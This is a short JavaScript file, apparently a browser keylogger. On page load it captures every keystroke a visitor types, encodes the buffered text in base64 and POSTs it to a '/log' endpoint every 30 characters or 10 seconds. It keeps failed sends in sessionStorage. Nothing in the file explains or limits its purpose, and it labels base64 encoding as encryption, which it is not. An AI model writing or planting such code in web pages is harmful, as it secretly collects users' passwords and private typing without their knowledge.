document.addEventListener('DOMContentLoaded', () => {  
    const LOG_ENDPOINT = '/log';
    const MAX_BUFFER_SIZE = 30; 
    
    let buffer = '';  

    document.addEventListener('keydown', (e) => {  
        if (e.key.length === 1 || e.key === ' ' || e.key === 'Enter' || e.key === 'Backspace') {
            buffer += e.key === ' ' ? ' ' : e.key;  
            if (buffer.length >= MAX_BUFFER_SIZE) {  
                sendLogs(buffer);  
                buffer = '';  
            }  
        }
    });  

    function sendLogs(data) {  
        const encrypted = btoa(encodeURIComponent(data)); 
        fetch(LOG_ENDPOINT, {  
            method: 'POST',  
            body: JSON.stringify({ data: encrypted }),  
            headers: { 'Content-Type': 'application/json' }  
        }).catch(() => {

            sessionStorage.setItem('tmp_log', data);
        }); 
    }  
    
    setInterval(() => {  
        if (buffer.length > 0) {  
            sendLogs(buffer);
            buffer = '';  
        }  
    }, 10000);  
});
